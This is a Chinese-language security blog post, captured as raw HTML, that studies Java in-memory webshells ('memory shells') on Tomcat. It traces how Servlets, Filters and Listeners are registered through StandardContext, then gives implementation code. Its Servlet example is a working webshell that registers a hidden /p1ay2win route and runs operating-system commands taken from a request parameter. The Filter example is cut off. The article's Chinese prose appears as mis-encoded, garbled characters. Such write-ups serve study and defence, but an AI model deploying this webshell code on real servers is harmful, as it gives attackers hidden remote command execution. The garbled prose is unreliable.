<!DOCTYPE html>
<html  lang="zh">
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 3.8.0" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹  - P1ay2win&#39;s blog</title>
<meta name="twitter:card" content="summary_large_image">
<meta property="og:site_name" content="P1ay2win's blog">
<meta property="og:type" content="website">
<meta property="og:title" content="Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹  | P1ay2win's blog">
<meta property="og:image" content="http://127.0.0.1/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /">
<meta property="twitter:image" content="http://127.0.0.1/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /">






<link rel="alternative" href="/atom.xml" title="Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ " type="application/atom+xml">



<link rel="icon" href="/images/header.png">


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/back-to-top.css">

    
    
    
    
    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    
    


<link rel="stylesheet" href="/css/style.css">

</head>
<body class="is-3-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <img src="/images/header.png" alt="Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ " height="28">
                P1ay2win&#39;s blog
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item"
                href="/">ä¸»é¡µ</a>
                
                <a class="navbar-item"
                href="/archives">å½’æ¡£</a>
                
                <a class="navbar-item"
                href="/categories">åˆ†ç±»</a>
                
                <a class="navbar-item"
                href="/tags">æ ‡ç­¾</a>
                
            </div>
            
            <div class="navbar-end">
                
                    
                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                    
                
                
                <a class="navbar-item is-hidden-tablet catalogue" title="ç›®å½•" href="javascript:;">
                    <i class="fas fa-list-ul"></i>
                </a>
                
                
                <a class="navbar-item search" title="æœç´¢" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
            </div>
        </div>
    </div>
</nav>

    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2021-09-27T06:37:53.000Z">2021-09-27</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/ä»£ç å®¡è®¡/">ä»£ç å®¡è®¡</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    17 åˆ†é’Ÿ è¯»å®Œ (å¤§çº¦ 2542 ä¸ªå­—)
                </span>
                
                
                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>æ¬¡é˜…è¯»
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ 
            
        </h1>
        <div class="content">
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å†…å­˜é©¬ä¹‹å‰æœ‰æ¥è§¦è¿‡ï¼Œåœ¨é˜¿é‡ŒSRCçš„å®™æ–¯æ´»åŠ¨ä¸­è–…äº†ç‚¹ç¾Šæ¯›ï¼Œä½†å½“æ—¶åªæ˜¯ä¼šç”¨ï¼Œä¸äº†è§£ä»–çš„åŸç†ã€‚æœ¬æ–‡é€šè¿‡è°ƒè¯•çš„æ–¹æ³•äº†è§£å†…å­˜é©¬çš„åŸç†ï¼Œå¹¶å®ç°å¸¸è§çš„å‡ ç§å†…å­˜é©¬ã€‚</p>
<a id="more"></a>
<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="Java-Webä¸‰å¤§ç»„ä»¶"><a href="#Java-Webä¸‰å¤§ç»„ä»¶" class="headerlink" title="Java Webä¸‰å¤§ç»„ä»¶"></a>Java Webä¸‰å¤§ç»„ä»¶</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servletæ˜¯Server Appletçš„ç¼©å†™ï¼Œå³æœåŠ¡ç«¯å°ç¨‹åºï¼Œå¯ä»¥æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ï¼Œå¹¶å°†å“åº”æ•°æ®å‘é€å›å®¢æˆ·ç«¯ã€‚Servletæ˜¯Java Webä¸­æœ€å¸¸ç”¨çš„ä¸€ç§ç»„ä»¶ï¼Œå°±ç®—åªç”¨åˆ°äº†jspæˆ–jspxå¼€å§‹ï¼Œå®é™…ä¸Šä¹Ÿç”¨åˆ°äº†Servletï¼Œå› ä¸ºjspå’Œjspxæœ¬è´¨ä¸Šæ˜¯HttpServletï¼Œè€ŒHttpServletåˆæ˜¯Servletçš„å­ç±»ã€‚</p>
<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filterå¯ä»¥åœ¨è¯·æ±‚åˆ°è¾¾Servletã€å“åº”åˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå¯¹è¯·æ±‚æˆ–å“åº”åšå¤„ç†ï¼Œå› æ­¤Listenerå¸¸è¢«ç”¨æ¥å®ç°è¿‡æ»¤æˆ–è®¿é—®æ§åˆ¶ç­‰ã€‚</p>
<h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listeneræ˜¯ç”¨æ¥ç›‘å¬æŸä¸€äº‹ä»¶çš„ï¼Œå…·ä½“å¯å®ç°ç»Ÿè®¡åœ¨çº¿ç”¨æˆ·æ•°ã€è®¿é—®ç»Ÿè®¡ç­‰ã€‚Listenerçš„ç§ç±»å¾ˆå¤šï¼Œæœ‰<code>ServletContextAttributeListener</code>ã€<code>ServletRequestAttributeListener</code>ã€<code>ServletRequestListener</code>ã€<code>HttpSessionIdListener</code>å’Œ<code>HttpSessionAttributeListener</code>ã€‚å…¶ä¸­<code>ServletRequestListener</code>æ˜¯ç”¨æ¥ç›‘å¬è¯·æ±‚çš„ï¼Œå¾ˆé€‚åˆå®ç°å†…å­˜é©¬ã€‚</p>
<h3 id="ä¸¤ç§ä¸Šä¸‹æ–‡"><a href="#ä¸¤ç§ä¸Šä¸‹æ–‡" class="headerlink" title="ä¸¤ç§ä¸Šä¸‹æ–‡"></a>ä¸¤ç§ä¸Šä¸‹æ–‡</h3><p>ä¸å†…å­˜é©¬ç›¸å…³çš„ä¸¤ç§ä¸Šä¸‹æ–‡æ˜¯ApplicationContextå’ŒStandardContextã€‚ApplicationContextæ˜¯å®ç°ServletContextçš„ç±»ï¼Œè®°å½•çš„æ˜¯Servletçš„ä¸€äº›ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œè€ŒStandardContextè®°å½•çš„æ˜¯åŒ…æ‹¬web.xmlåœ¨å†…çš„ä¸€äº›Webåº”ç”¨ä¿¡æ¯ã€‚</p>
<p>è‡³äºä»€ä¹ˆæ˜¯Contextï¼Œä¸ªäººç†è§£æ˜¯ä¸å®ƒçš„ä¸­æ–‡æ„æ€ä¸€æ ·ï¼Œä¸Šä¸‹æ–‡æˆ–è¯­å¢ƒï¼Œæ˜¯ä¸€ç§å°èŒƒå›´çš„ç¯å¢ƒå˜é‡ï¼Œå½“ç„¶ä¹Ÿå› ä¸ºæ˜¯ä¸€ä¸ªç±»ï¼Œæœ‰ç›¸åº”çš„æœ‰æ–¹æ³•æ“ä½œè¿™äº›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p>
<p>Contextçš„è·å–ä¹Ÿéœ€è¦æä¸€æï¼Œå› ä¸ºæ˜¯åç»­å†…å­˜é©¬çš„åŠ è½½ä¾èµ–äºStandardContextï¼Œæ˜¯å†…å­˜é©¬çš„å…³é”®ã€‚å…¶ä¸­å¸¸ç”¨çš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡HttpServletRequestå¯¹è±¡çš„<code>getServletContext</code>æ–¹æ³•è·å–ServletContextå¯¹è±¡ï¼Œå®é™…ä¸Šæ˜¯å°è£…äº†ApplicationContentçš„ApplicationContextFacadeï¼Œè€ŒApplicationContextåˆæ˜¯tomcatä¸­æ—¶å®ç°ServletContextæ¥å£çš„ç±»ï¼Œç„¶åå…¶ä¸­æœ‰<code>context</code>å±æ€§ï¼Œå­˜å‚¨ç€StandardContextå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡åå°„è·å–ã€‚</p>
<p><img src="/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /å±å¹•æˆªå›¾ 2021-09-27 133752.png" alt></p>
<p>å¦‚æœæ²¡æœ‰requestçš„è¯ï¼Œè¿˜å¯ä»¥ä»çº¿ç¨‹ä¸­è·å–ï¼Œè¯¦ç»†åˆ†æå¯ä»¥çœ‹é•¿äº­ä¸€ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/114625962" target="_blank" rel="noopener">Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a>ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä»MBeanä¸­è·å–ï¼Œä½†ç›¸å¯¹å¤æ‚ä¸€äº›ã€‚</p>
<p><img src="/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /å±å¹•æˆªå›¾ 2021-09-27 135737.png" alt></p>
<h2 id="web-xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•"><a href="#web-xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•" class="headerlink" title="web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•"></a>web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•</h2><p>å¤§å¤šæ•°å¸ˆå‚…çš„å†…å­˜é©¬åˆ†ææ–‡ç« éƒ½æ˜¯ä»ApplicationContextçš„<code>addServlet</code>ã€<code>addFilter</code>å’Œ<code>addListener</code>æ–¹æ³•äº†è§£Java Webä¸‰å¤§ç»„ä»¶çš„åŠ è½½åŸç†çš„ï¼Œä½†æœ¬æ–‡ä»web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹çš„è§’åº¦åˆ†æå†…å­˜é©¬åŸç†ï¼Œä¸è¿‡å®è´¨ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ€ç»ˆä¿®æ”¹StandardCotextçš„å†…å®¹å®ç°çš„ã€‚</p>
<p>æ—¢ç„¶æ˜¯è°ƒè¯•ï¼Œè¦å…ˆåšäº›å‡†å¤‡å·¥ä½œï¼Œåœ¨IDEAä¸­æ–°å»ºä¸€ä¸ªJava Webé¡¹ç›®åï¼Œè¿˜éœ€åœ¨mavenä¸­æ·»åŠ ä¸ª<code>tomcat-embed-core</code>çš„ä¾èµ–å¦‚ä¸‹ï¼Œç‰ˆæœ¬åˆ™è®¾ç½®ä¸æœ¬åœ°tomcatç‰ˆæœ¬ç›¸åŒï¼Œæ–¹ä¾¿ä¸‹æ–­ç‚¹å’Œè°ƒè¯•ã€‚</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.71&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>ç”±äºå¯¹tomcatçš„æºç æ²¡æœ‰ç ”ç©¶ï¼Œæ‰€ä»¥çœŸä¸çŸ¥é“æ®µç‚¹åº”è¯¥åœ¨å“ªé‡Œä¸‹ï¼Œå¥½åœ¨åœ¨ç½‘ä¸Šæ‰¾åˆ°ç¯‡æ–‡ç« å«<a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">Tomcatåº”ç”¨ web.xmlçš„åŠ è½½è¿‡ç¨‹</a>ã€‚æ–‡ä¸­æåˆ°web.xmlçš„åŠ è½½åˆ°StandardContextç”±<code>org.apache.catalina.startup.ContextConfig</code>ç±»çš„<code>configureContext</code>æ–¹æ³•å®ç°ã€‚</p>
<p>æ­¤æ—¶åœ¨web.xmlä¸­é…ç½®ä¸‰å¤§ç»„ä»¶å¦‚ä¸‹ï¼Œå¹¶åœ¨<code>configureContext</code>æ–¹æ³•å¤„ä¸‹æ®µç‚¹å³å¯å¼€å§‹è°ƒè¯•ã€‚</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨webxmlå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯web.xmlè§£æåçš„å†…å®¹ï¼Œè°ƒç”¨çš„æ–¹æ³•åå¯å¾—çŸ¥ï¼Œ<code>configureContext</code>æ–¹æ³•å…ˆåä½¿ç”¨å±æ€§<code>context</code>ï¼Œä¹Ÿå°±æ˜¯StandardContextçš„å®ä¾‹ï¼Œæ·»åŠ Fiterã€Listenerå’ŒServletã€‚</p>
<p><img src="/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /å±å¹•æˆªå›¾ 2021-09-26 232643.png" alt></p>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    Wrapper wrapper = context.createWrapper();</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    ...</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…ˆè¯´è¯´ServletåŠ è½½çš„æµç¨‹ï¼ŒStandardContextå®ä¾‹æ–°å»ºä¸€ä¸ªWrapperï¼Œç„¶åå°è£…è¿›Servletåå’ŒServletç±»åçš„ä¿¡æ¯ï¼Œåœ¨åŠ å…¥ä¸ºStandardContextçš„å­å®¹å™¨ï¼Œè¿™é‡Œå¯¹äºçš„æ˜¯web.xmlä¸­çš„<code>&lt;servlet&gt;</code>ï¼›æ¥ç€è·å–ServletMappingä¿¡æ¯ï¼ŒåŠ å…¥åˆ°StandardContextçš„ServletMappingä¸­ï¼Œå¯¹åº”çš„æ˜¯<code>&lt;servlet-mapping&gt;</code>ã€‚</p>
<p>åœ¨Filterçš„åŠ è½½æµç¨‹ä¸­ï¼Œå…ˆåå°†FilterDefå’ŒFilterMapåŠ å…¥åˆ°StandardContextå®ä¾‹ä¸­ï¼Œå¯¹åº”çš„æ˜¯<code>&lt;filter&gt;</code>å’Œ<code>&lt;filter-mapping&gt;</code>ã€‚</p>
<p>åœ¨Listenerçš„åŠ è½½æµç¨‹ä¸­ï¼Œåªéœ€å°†filterååŠ å…¥åˆ°StandardContextå®ä¾‹çš„applicationListenerä¸­ã€‚</p>
<p>æŒ‰ç…§ä¸Šè¿°æµç¨‹ï¼Œå†™ä¸€ä¸ªServletçš„å†…å­˜é©¬æ˜¯æ­£å¸¸çš„ï¼Œè€ŒFilterå’ŒListenerå°±æ²¡æœ‰ç”Ÿæ•ˆï¼Œä¸ApplicationContextçš„<code>addFilter</code>å’Œ<code>addListener</code>æ–¹æ³•å’Œæ­£å¸¸åŠ è½½web.xmlçš„StandardContextå®ä¾‹å¯¹æ¯”ï¼ŒStandardContextå®ä¾‹æ­£å¸¸æƒ…å†µä¸‹Filterè¿˜è®¾ç½®äº†çš„filterConfigï¼Œè€ŒListenerè¿˜è®¾ç½®äº†applicationEventListenerã€‚</p>
<p>å¯¹è¿™ä¸¤ä¸ªå±æ€§ä¸‹æ–­ç‚¹ï¼ŒåŠ è½½äº†web.xmlé…ç½®åï¼ŒStandardContextå®ä¾‹è¿˜åˆ†åˆ«è°ƒç”¨<code>listenerStart</code>å’Œ<code>filterStart</code>æ–¹æ³•ï¼Œè®¾ç½®äº†ä¸Šè¿°ä¸¤ä¸ªå±æ€§ï¼Œæ‰€ä»¥å†…å­˜é©¬æœ€ç»ˆä¹Ÿéœ€è¦è°ƒç”¨<code>listenerStart</code>å’Œ<code>filterStart</code>æ–¹æ³•æ‰å®ŒæˆListenerå’ŒFilterçš„åŠ è½½ã€‚</p>
<p><img src="/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /å±å¹•æˆªå›¾ 2021-09-27 110219.png" alt></p>
<p><img src="/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /å±å¹•æˆªå›¾ 2021-09-27 110946.png" alt></p>
<p>å†è¯´ä¸€ä¸ªå°è¯•å†™å†…å­˜é©¬æ—¶å€™é‡åˆ°çš„å‘ï¼Œä¸€å¼€å§‹ä¹Ÿåƒç½‘ä¸Šå¤§å¤šæ•°çš„ä¾‹å­ä¸€æ ·åœ¨æ–¹æ³•é‡Œå®ç°Servletã€Filterå’ŒListeneræ¥å£ï¼Œå¹¶å®ä¾‹åŒ–ï¼›ç„¶åå®Œå…¨æŒ‰ç…§tomcatå¯åŠ¨æµç¨‹åŠ è½½è¿™ä¸‰ä¸ªç»„ä»¶çš„æ—¶å€™æ²¡æ•ˆæœï¼Œåœ¨ä¸€ä¸ªæŠ¥é”™é¡µé¢ä¸­çœ‹åˆ°æ— æ³•å®ä¾‹åŒ–çš„å¼‚å¸¸ï¼Œåœ¨StandardContextå®ä¾‹ç¡®å®ä¹Ÿæ²¡çœ‹åˆ°è¿™ä¸‰ä¸ªç»„ä»¶çš„å®ä¾‹ã€‚äºæ˜¯ä»StandardContextçš„<code>stratInternal</code>æ–¹æ³•ä¸€æ­¥ä¸€æ­¥è°ƒï¼Œå‘ç°ä¼šä½¿ç”¨ä¼ å…¥çš„ä¸‰ä¸ªç»„ä»¶çš„ç±»åè¿›è¡Œå®ä¾‹åŒ–ï¼Œç”±äºæ˜¯åœ¨æ–¹æ³•é‡Œå®ç°çš„ä¸‰ä¸ªç»„ä»¶çš„æ¥å£ç±»ï¼Œè¿™ä¸‰ä¸ªç»„ä»¶çš„ç±»å±äºæ˜¯å†…éƒ¨ç±»ï¼Œæ‰€ä»¥æ™®é€šçš„åå°„æ²¡æ³•å®ä¾‹åŒ–è¿™ä¸‰ä¸ªç±»ï¼Œå¯¼è‡´è¿™ä¸‰ä¸ªç»„ä»¶æ²¡æ³•æ­£å¸¸åŠ è½½ã€‚</p>
<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>æ­¤å¤„å°ç»“æ€»ç»“ä¸‹ä¸‰ä¸ªä¸»é”®çš„åŠ è½½æ¡ä»¶</p>
<p><strong>Servlet</strong></p>
<ul>
<li>Wrapperå°è£…Servletçš„ä¿¡æ¯</li>
<li>åŠ å…¥Wrapperåˆ°StandardContextçš„childrenä¸­</li>
</ul>
<p><strong>Filter</strong></p>
<ul>
<li>åŠ å…¥åˆ°StandardContextçš„filterDefs</li>
<li>åŠ å…¥åˆ°StandardContextçš„filterMaps</li>
<li>åŠ å…¥åˆ°StandardContextçš„filterConfigs</li>
</ul>
<p><strong>Listener</strong></p>
<ul>
<li>åŠ å…¥Listenerå¯¹è±¡åˆ°StandardContextçš„applicationEventListenerä¸­</li>
</ul>
<h2 id="ä¸‰ç§å†…å­˜é©¬å®ç°"><a href="#ä¸‰ç§å†…å­˜é©¬å®ç°" class="headerlink" title="ä¸‰ç§å†…å­˜é©¬å®ç°"></a>ä¸‰ç§å†…å­˜é©¬å®ç°</h2><p>è¿™é‡Œç›´æ¥è´´ä»£ç äº†</p>
<ul>
<li>Servlet</li>
</ul>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ServletDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (standardContext.findServletMapping(<span class="hljs-string">"/p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            wrapper.setServletClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="hljs-string">"/p1ay2win"</span>, <span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c"</span> + request.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Filter</li>
</ul>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FilterDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> 